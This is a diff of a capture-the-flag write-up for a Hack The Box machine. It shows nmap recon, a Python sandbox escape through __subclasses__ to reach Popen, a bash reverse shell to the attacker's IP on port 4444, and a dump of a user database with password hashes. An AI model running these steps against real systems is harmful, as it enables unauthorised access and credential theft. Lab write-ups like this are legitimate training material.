@@ -3,8 +3,8 @@ Easy Linux Box
 ## Recon
 nmap
 ```Bash
-[us-vip-2][10.10.14.2][gntsqid@htb-1p7vgdsbjq][~]
- []$ sudo nmap -T5 --min-rate=1500  code.htb 
+┌─[us-vip-2]─[10.10.14.2]─[gntsqid@htb-1p7vgdsbjq]─[~]
+└──╼ [★]$ sudo nmap -T5 --min-rate=1500  code.htb 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 18:30 CDT
 Nmap scan report for code.htb (10.10.11.62)
 Host is up (0.065s latency).
@@ -14,8 +14,8 @@ PORT     STATE SERVICE
 5000/tcp open  upnp
 
 Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
-[us-vip-2][10.10.14.2][gntsqid@htb-1p7vgdsbjq][~]
- []$ sudo nmap -T5 --min-rate=1500 -sU code.htb 
+┌─[us-vip-2]─[10.10.14.2]─[gntsqid@htb-1p7vgdsbjq]─[~]
+└──╼ [★]$ sudo nmap -T5 --min-rate=1500 -sU code.htb 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 18:30 CDT
 Nmap scan report for code.htb (10.10.11.62)
 Host is up (0.13s latency).
@@ -33,8 +33,8 @@ PORT      STATE  SERVICE
 finding...\
 looks like flask:
 ```Bash
-[us-vip-2][10.10.14.2][gntsqid@htb-1p7vgdsbjq][~]
- []$ curl -i http://code.htb:5000
+┌─[us-vip-2]─[10.10.14.2]─[gntsqid@htb-1p7vgdsbjq]─[~]
+└──╼ [★]$ curl -i http://code.htb:5000
 HTTP/1.1 200 OK
 Server: gunicorn/20.0.4
 Date: Mon, 16 Jun 2025 23:37:22 GMT
@@ -144,7 +144,10 @@ Vary: Cookie
 </body>
 </html>
 ```
-[screenshot]
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/7daa1b50-b5ea-40b0-87ef-dd54c9c3b492) returned 404 during the image audit (2026-10-08).
+
 
 ## Python
 This will show all available sub-classes
@@ -168,7 +171,10 @@ for i, x in enumerate((()).__class__.__base__.__subclasses__()):
     except:
         pass
 ```
-[screenshot]
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/29800e9d-b986-4845-addd-9873cef02bd1) returned 404 during the image audit (2026-10-08).
+
 
 Woot!\
 Now we can directly target popen by id!
@@ -192,7 +198,10 @@ cls = ().__class__.__base__.__subclasses__()[317]
 cls(["bash","-c","bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"], stdout=-1).communicate()
 ```
 
-[screenshot]\
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/dbdd2d81-df70-4428-8e2d-aa92640a4502) returned 404 during the image audit (2026-10-08).
+
+
 Success!!
 
 Let us stabilize
@@ -299,7 +308,6 @@ class User(db.Model):
     username = db.Column(db.String(80), unique=True, nullable=False)
     password = db.Column(db.String(80), nullable=False)
     codes = db.relationship('Code', backref='user', lazy=True)
-
 
 
 class Code(db.Model):
@@ -439,22 +447,22 @@ and look who we get the credentials of now...
 ```Bash
 app-production@code:~/app$ cat instance/database.db
 cat instance/database.db
-O"OPtablecodecodeCREATE TABLE code (
+�O"�O�P�tablecodecodeCREATE TABLE code (
 	id INTEGER NOT NULL, 
 	user_id INTEGER NOT NULL, 
 	code TEXT NOT NULL, 
 	name VARCHAR(100) NOT NULL, 
 	PRIMARY KEY (id), 
 	FOREIGN KEY(user_id) REFERENCES user (id)
-)*7tableuseruserCREATE TABLE user (
+)�*�7tableuseruserCREATE TABLE user (
 	id INTEGER NOT NULL, 
 	username VARCHAR(80) NOT NULL, 
 	password VARCHAR(80) NOT NULL, 
 	PRIMARY KEY (id), 
 	UNIQUE (username)
-QQR*Mmartin3de6f30c4a09c27fc71932bfc68474be/#Mdevelopment759b74ce43947f5f4c91aeddc3e5bad3
-
-&$n#	Cprint("Functionality test")Testapp-production@code:~/app$
+���QQR*Mmartin3de6f30c4a09c27fc71932bfc68474be/#Mdevelopment759b74ce43947f5f4c91aeddc3e5bad3
+�����
+���&$n#	Cprint("Functionality test")Testapp-production@code:~/app$
 ```
 ```Bash
 echo "3de6f30c4a09c27fc71932bfc68474be" > martin.hash
@@ -543,8 +551,6 @@ the json file\
 	]
 }
 ```
-
-
 
 
 > SCRATCH THAT...GOT THE SOLUTION
